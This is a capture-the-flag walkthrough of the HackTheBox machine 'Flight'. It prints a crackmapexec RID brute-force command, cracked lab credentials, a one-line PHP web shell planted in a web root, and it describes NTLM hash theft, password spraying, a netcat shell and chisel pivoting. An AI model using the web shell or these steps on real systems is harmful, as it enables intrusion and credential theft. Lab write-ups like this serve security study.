<h3> Flight HackTheBox </h3>

Difficulty = Hard

Nmap Scan:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c012e655-7e5c-4c31-8bf3-d31ab3d068d6)

We can see the domain name *flight.htb* I added it to my */etc/hosts* file

So there are lots of port but lets start enumerating

Checking smb doesn't allow anonymous listing of shares
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9296cc02-c57a-4eda-9c4a-b4541a8bd824)

Moving over to the web server on port 80 shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/432b7a5c-8c37-426f-bb93-f8540d78ca8f)

There's nothing really there

So lets fuzz for subdomains
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/129097e3-8909-4f06-90f0-5e255ca79ee2)

I'll update my */etc/hosts* file with the new sub domain

Checking it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/73ecbdbf-a6f4-4915-bb3d-6d665b840d05)

When I clicked on the home button i get this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c2c901e0-2e9f-4b5b-84ed-e551893e52db)

Noticing the url we can see that it's including the file *home.html*

We can say that this is vulnerable to local file inclusion lets confirm it 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1c0a9997-6e39-48e1-be14-a0bfa3c115f0)

One way we can exploit this is by trying to perform ntlm hash theft 

Using responder i'll steal the ntlm hash
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6c41a537-551f-4fe6-aaa5-c3c21bcec541)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a55adb5c-80f3-49a1-b3fa-854601f3a899)

While on the web server I'll do this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/890cf68a-99be-4947-843f-862fa322773f)

Back on responder I got the hash for user *svc_apache*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b99248b3-00e9-4a8a-bb67-67b1977a0eed)

I brute forced it using JTR 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e2308968-3279-4b93-9a4b-06737a3e685c)

Now we have a cred `svc_apache:S@Ss!K@*t13`

Trying to authenticate to winrm fails 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fb1d2dd8-52b8-4dd4-bcfd-baec906a7ccf)

But we can login to smb using the cred
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/84057eae-b3fb-44be-9d06-8a0d697a16a2)

It shows the smb hostname as *G0* I also added that to my */etc/hosts* file

We don't really have good access over the shares but searching through the shares doesn't reveal any form of interesting cred
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/621c1544-ee11-48a7-b5de-dc8a67d859a2)

One thing we can do since we have smb cred is to get list of users on the box via *rid bruteforce* then perform a password spraying attack
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/880fe446-2b07-4ce0-96c6-2c1a546ff94c)

I saved the result in a file then used bash scripting to get only the usernames there

```
Command:
crackmapexec smb flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13' --rid-brute > brute
cat brute | awk '{print $6}' | grep flight | cut -d '\' -f 2 | grep -v svc_apache > users.txt
```

Now we can use kerbrute to perform password spraying
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7fd70294-7f1d-40b9-b985-566b6af6c2ee)

Cool we have another user's cred `S.Moon:S@Ss!K@*t13`

Trying the cred over winrm fails
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3f04279a-329d-47f2-bcc7-582c7db18ca5)

Checking the perm the user has over smb shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0ed3fd86-c81d-4894-9784-0fec6423c2da)

Nice we have write access over the *Shared* share

But looking at the shares shows that no file is there
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4a9603fb-74f0-4cdb-a5c7-92f2dd367962)

What we can attempt to do is to upload a file whether *scf or ini* to perform ntlm hash theft

I used this [script](https://github.com/Greenwolf/ntlm_theft) to generate the payload file
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8a57713e-6f1c-49bf-a382-8346f2484a40)

I had responder listening already and after some seconds I got a hit
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/42013ca3-f4be-40bb-b359-ad4e83458707)

I saved the hash then brute forced it using JTR
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ca94464f-f23c-429c-af71-aeced185015b)

We have another cred `c.bum:Tikkycoll_431012284`

Using cme i tried if it can connect to winrm but nope it can't
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/94ffe11c-cfbb-451b-bc1f-c66668f2e6dc)

Checking the perm the user has over smb gives this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0ca48bf4-77e5-4b2d-86f9-f7e9958669aa)

Nice we have access over the Web shares

Moving over there shows that this is where the web server files are placed
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cb232b32-9340-4f12-9123-4d02b8529734)

I uploaded a php command execution script
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/46402f2e-bcaa-4bfa-b926-2e15e4e06761)

```php
<?php
system($_REQUEST['c']);
?>
```

We can now access it from the web server
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4fd99908-e66d-4600-b3f3-422b388dcb10)

To get shell I uploaded nc to the smb and then got shell from it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2ef35092-24bd-436a-b199-ff7cee2e16e4)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bb20f60e-0d5b-48cb-a37a-c32b730d5bda)

Shell finally 😃

Lets see what we can do from here
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2f8b794a-bc58-4a65-a269-008fc0a972ae)

But what I noticed that the current working directory was *C:\xampp\htdocs\flight.htb* but there's a *inetpub* directory in the *C:/* drive

So this means maybe there's an internal web app running 🤔

Checking that directory shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/48468b00-b9e9-4585-9056-f48c78e392cf)

We can conclude that the only user privileged to access the *development* directory is user *C.Bum*

Though we have the user's cred but since our shell can't work well when we run *runas* i'll need a better shell

Luckily there's a tool called [RunasCs](https://github.com/antonioCoco/RunasCs) that can help with this

I uploaded it to the box then got to switch to user c.bum
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6004085a-1293-48fd-98f3-918d862fb696)

Back to the web directory it shows the user has write access over it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1c3473dd-2836-45df-b4dc-092e63149b50)

So what i did was to upload a aspx shell since the web server will be IIS
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9aad22ff-2f43-4945-ae28-86d863e98d6a)

Now lets see if there's any internal port
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2cc26d04-6eec-4557-8f33-f1c7b58ccee1)

```
Command: netstat -ano
```

Port 8000 looks promising cause something is listening on it

And yea it's a web server
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/58ec6cb2-3e6e-45c0-b8b3-447a601c97f4)

Using chisel I port forwarded the internal port
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a7e80222-519f-44e4-a74e-d213561fb89c)

Back on our host we can now access the internal web server
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/37e6f914-8bd4-489f-bd4e-9d5a50152e4b)
